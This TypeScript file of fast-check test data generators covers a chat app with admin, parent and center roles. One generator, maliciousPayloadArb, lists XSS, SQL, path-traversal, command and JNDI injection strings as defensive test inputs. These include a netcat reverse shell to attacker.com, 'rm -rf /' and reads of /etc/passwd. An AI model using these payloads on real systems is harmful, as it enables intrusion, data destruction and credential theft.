import * as fc from 'fast-check';

// User role generator
export const userRoleArb = fc.constantFrom('admin', 'parent', 'center');

// User ID generator (positive integers)
export const userIdArb = fc.integer({ min: 1, max: 10000 }).map(id => id.toString());

// Message content generator
export const messageContentArb = fc.string({ minLength: 1, maxLength: 1000 });

// Valid message content (non-empty, reasonable length)
export const validMessageContentArb = fc.string({ minLength: 1, maxLength: 500 })
  .filter(str => str.trim().length > 0);

// Invalid message content (empty, too long, or null/undefined)
export const invalidMessageContentArb = fc.oneof(
  fc.constant(''), // Empty string
  fc.constant('   '), // Only whitespace
  fc.string({ minLength: 1001, maxLength: 2000 }), // Too long
  fc.constant(null),
  fc.constant(undefined)
);

// Timestamp generator
export const timestampArb = fc.date({ min: new Date('2020-01-01'), max: new Date() })
  .map(date => date.toISOString());

// User generator
export const userArb = fc.record({
  id: userIdArb,
  name: fc.string({ minLength: 1, maxLength: 50 }),
  email: fc.emailAddress(),
  role: userRoleArb,
  avatar: fc.option(fc.webUrl(), { nil: undefined }),
});

// Message generator
export const messageArb = fc.record({
  id: fc.integer({ min: 1, max: 100000 }),
  sender_id: fc.integer({ min: 1, max: 1000 }),
  receiver_id: fc.integer({ min: 1, max: 1000 }),
  message: validMessageContentArb,
  image: fc.option(fc.string(), { nil: null }),
  video_url: fc.option(fc.webUrl(), { nil: null }),
  created_at: timestampArb,
  updated_at: timestampArb,
  is_read: fc.boolean(),
  is_read_admin: fc.boolean(),
  image_url: fc.option(fc.webUrl(), { nil: null }),
  video_url_path: fc.option(fc.webUrl(), { nil: null }),
});

// Admin message generator (includes admin-specific fields)
export const adminMessageArb = fc.record({
  id: fc.integer({ min: 1, max: 100000 }),
  sender_id: fc.integer({ min: 1, max: 1000 }),
  receiver_id: fc.integer({ min: 1, max: 1000 }),
  message: validMessageContentArb,
  image: fc.option(fc.string(), { nil: null }),
  video_url: fc.option(fc.webUrl(), { nil: null }),
  created_at: timestampArb,
  updated_at: timestampArb,
  is_read: fc.boolean(),
  is_read_admin: fc.boolean(),
  image_url: fc.option(fc.webUrl(), { nil: null }),
  video_url_path: fc.option(fc.webUrl(), { nil: null }),
  is_admin_message: fc.constant(true),
  original_conversation_sender: userIdArb,
  original_conversation_receiver: userIdArb,
});

// Chat list item generator
export const chatListItemArb = fc.record({
  id: userIdArb,
  name: fc.string({ minLength: 1, maxLength: 50 }),
  avatar: fc.option(fc.webUrl(), { nil: undefined }),
  type: userRoleArb,
  lastMessage: fc.option(validMessageContentArb, { nil: undefined }),
  timestamp: fc.option(fc.date(), { nil: undefined }),
  unreadCount: fc.integer({ min: 0, max: 100 }),
  isOnline: fc.option(fc.boolean(), { nil: undefined }),
  email: fc.option(fc.emailAddress(), { nil: undefined }),
});

// Conversation generator
export const conversationArb = fc.record({
  id: userIdArb,
  participants: fc.array(userArb, { minLength: 2, maxLength: 10 }),
  messages: fc.array(messageArb, { minLength: 0, maxLength: 100 }),
  unreadCount: fc.integer({ min: 0, max: 50 }),
  type: fc.constantFrom('parent-center', 'admin-view'),
  createdAt: fc.date(),
  updatedAt: fc.date(),
});

// Role-based access control scenario generator
export const roleAccessScenarioArb = fc.record({
  senderRole: userRoleArb,
  receiverRole: userRoleArb,
  senderId: userIdArb,
  receiverId: userIdArb,
}).map(scenario => ({
  ...scenario,
  // Determine if this combination is allowed based on business rules
  allowed: (
    scenario.senderRole === 'admin' || // Admin can chat with anyone
    (scenario.senderRole === 'parent' && scenario.receiverRole === 'center') ||
    (scenario.senderRole === 'center' && scenario.receiverRole === 'parent')
  ) && scenario.senderId !== scenario.receiverId, // Can't chat with self
}));

// Security payload generator (malicious inputs)
export const maliciousPayloadArb = fc.oneof(
  // XSS payloads
  fc.constant('<script>alert("xss")</script>'),
  fc.constant('<img src="x" onerror="alert(1)">'),
  fc.constant('javascript:alert("xss")'),
  fc.constant('<iframe src="javascript:alert(1)"></iframe>'),

  // SQL injection payloads
  fc.constant("'; DROP TABLE messages; --"),
  fc.constant("' OR '1'='1"),
  fc.constant("1; DELETE FROM users; --"),
  fc.constant("UNION SELECT * FROM users"),

  // Path traversal payloads
  fc.constant('../../../etc/passwd'),
  fc.constant('..\\..\\..\\windows\\system32\\config\\sam'),

  // Command injection payloads
  fc.constant('$(rm -rf /)'),
  fc.constant('`cat /etc/passwd`'),
  fc.constant('|nc -e /bin/sh attacker.com 4444'),

  // LDAP injection payloads
  fc.constant('${jndi:ldap://evil.com/a}'),
  fc.constant('${jndi:rmi://evil.com/a}'),

  // NoSQL injection payloads
  fc.constant('{"$ne": null}'),
  fc.constant('{"$gt": ""}'),
);

// Performance test scenario generator
export const performanceScenarioArb = fc.record({
  messageCount: fc.integer({ min: 1, max: 10000 }),
  userCount: fc.integer({ min: 2, max: 100 }),
  concurrentUsers: fc.integer({ min: 1, max: 50 }),
  messageSize: fc.integer({ min: 1, max: 1000 }),
  networkLatency: fc.integer({ min: 0, max: 2000 }), // milliseconds
  expectedMaxLatency: fc.integer({ min: 100, max: 5000 }), // milliseconds
});

// API request generator
export const apiRequestArb = fc.record({
  method: fc.constantFrom('GET', 'POST', 'PUT', 'DELETE'),
  endpoint: fc.string({ minLength: 1, maxLength: 100 }),
  headers: fc.dictionary(fc.string(), fc.string()),
  body: fc.option(fc.object(), { nil: null }),
  authToken: fc.option(fc.string({ minLength: 10, maxLength: 200 }), { nil: null }),
});

// Rate limiting scenario generator
export const rateLimitScenarioArb = fc.record({
  userId: userIdArb,
  requestCount: fc.integer({ min: 1, max: 1000 }),
  timeWindow: fc.integer({ min: 1, max: 3600 }), // seconds
  rateLimit: fc.integer({ min: 1, max: 100 }), // requests per time window
}).map(scenario => ({
  ...scenario,
  shouldBeRateLimited: scenario.requestCount > scenario.rateLimit,
}));

// Network condition generator
export const networkConditionArb = fc.record({
  name: fc.constantFrom('fast', 'slow', 'unstable', 'offline'),
  latency: fc.integer({ min: 0, max: 5000 }), // milliseconds
  bandwidth: fc.integer({ min: 1, max: 1000 }), // Mbps
  packetLoss: fc.float({ min: 0, max: 0.5 }), // 0-50% packet loss
  jitter: fc.integer({ min: 0, max: 1000 }), // milliseconds
});

// Error scenario generator
export const errorScenarioArb = fc.record({
  type: fc.constantFrom(
    'network_error',
    'server_error',
    'auth_error',
    'validation_error',
    'rate_limit_error',
    'database_error'
  ),
  statusCode: fc.integer({ min: 400, max: 599 }),
  message: fc.string({ minLength: 1, maxLength: 200 }),
  retryable: fc.boolean(),
  expectedRecovery: fc.constantFrom('retry', 'refresh_token', 'user_action', 'none'),
});

// File attachment generator
export const fileAttachmentArb = fc.record({
  name: fc.string({ minLength: 1, maxLength: 100 }),
  size: fc.integer({ min: 1, max: 50 * 1024 * 1024 }), // Up to 50MB
  type: fc.constantFrom(
    'image/jpeg',
    'image/png',
    'image/gif',
    'video/mp4',
    'video/webm',
    'application/pdf',
    'text/plain'
  ),
  url: fc.webUrl(),
});

// Pagination scenario generator
export const paginationScenarioArb = fc.record({
  totalItems: fc.integer({ min: 0, max: 10000 }),
  pageSize: fc.integer({ min: 1, max: 100 }),
  currentPage: fc.integer({ min: 1, max: 100 }),
}).map(scenario => ({
  ...scenario,
  totalPages: Math.ceil(scenario.totalItems / scenario.pageSize),
  hasNextPage: scenario.currentPage < Math.ceil(scenario.totalItems / scenario.pageSize),
  hasPreviousPage: scenario.currentPage > 1,
}));

// Online status scenario generator
export const onlineStatusScenarioArb = fc.record({
  userId: userIdArb,
  isOnline: fc.boolean(),
  lastSeen: fc.option(timestampArb, { nil: null }),
  connectionType: fc.constantFrom('websocket', 'polling', 'offline'),
  deviceType: fc.constantFrom('desktop', 'mobile', 'tablet'),
});

// Cross-platform scenario generator
export const crossPlatformScenarioArb = fc.record({
  platform: fc.constantFrom('desktop', 'mobile', 'tablet'),
  browser: fc.constantFrom('chrome', 'firefox', 'safari', 'edge'),
  screenSize: fc.record({
    width: fc.integer({ min: 320, max: 3840 }),
    height: fc.integer({ min: 240, max: 2160 }),
  }),
  touchSupport: fc.boolean(),
  orientation: fc.constantFrom('portrait', 'landscape'),
});

// Accessibility scenario generator
export const accessibilityScenarioArb = fc.record({
  screenReader: fc.boolean(),
  keyboardNavigation: fc.boolean(),
  highContrast: fc.boolean(),
  reducedMotion: fc.boolean(),
  fontSize: fc.constantFrom('small', 'medium', 'large', 'extra-large'),
  colorBlindness: fc.constantFrom('none', 'protanopia', 'deuteranopia', 'tritanopia'),
});

// Complex integration scenario generator
export const integrationScenarioArb = fc.record({
  users: fc.array(userArb, { minLength: 2, maxLength: 10 }),
  messages: fc.array(messageArb, { minLength: 1, maxLength: 50 }),
  networkCondition: networkConditionArb,
  errorConditions: fc.array(errorScenarioArb, { minLength: 0, maxLength: 3 }),
  performanceRequirements: performanceScenarioArb,
});